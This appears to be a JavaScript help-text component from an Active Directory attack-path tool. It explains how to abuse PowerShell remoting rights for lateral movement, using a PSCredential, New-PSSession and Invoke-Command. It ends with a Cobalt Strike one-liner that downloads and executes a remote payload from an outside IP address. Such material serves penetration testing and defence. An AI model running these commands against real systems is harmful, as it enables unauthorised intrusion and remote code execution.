const Abuse = (sourceName, sourceType, targetName, targetType) => {
    let text = `Abuse of this privilege will require you to have interactive access with a system on the network.
    
    A remote session can be opened using the New-PSSession powershell command.

    You may need to authenticate to the Domain Controller as ${
        sourceType === 'User'
            ? `${sourceName} if you are not running a process as that user`
            : `a member of ${sourceName} if you are not running a process as a member`
    }. To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):
    
    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>

    Then use the New-PSSession command with the credential we just created:

    <code>$session = New-PSSession -ComputerName ${targetName} -Credential $Cred</code>
    
    This will open a powershell session on ${targetName}.
    
    You can then run a command on the system using the Invoke-Command cmdlet and the session you just created
    
    <code>Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}</code>

    Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands.
    
    <code>Disconnect-PSSession -Session $session
    Remove-PSSession -Session $session</code>

    An example of running through this cobalt strike for lateral movement is as follows:

    <code>powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session</code>
    `;
    return { __html: text };
};

export default Abuse;
